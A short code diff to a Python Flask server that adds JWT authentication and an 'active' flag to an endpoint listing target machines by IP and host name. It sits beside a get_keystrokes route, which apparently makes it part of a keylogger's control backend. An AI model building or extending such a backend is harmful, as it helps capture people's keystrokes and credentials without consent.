@@ -134,11 +134,12 @@ def get_keystrokes():
 
 
 @app.route('/api/get_target_machines_list', methods=['GET'])
+@jwt_required()
 def get_target_machines_list():
     try:
         with open('data.json', 'r', encoding='utf-8') as f:
             data = json.load(f)
-            machines = {sn: {'ip':machine_data['ip'],'name':machine_data['host name']} for sn, machine_data in data.items()}
+            machines = {sn: {'ip':machine_data['ip'],'name':machine_data['host name'],'active':True} for sn, machine_data in data.items()}
     except Exception as e:
         machines = {}
 
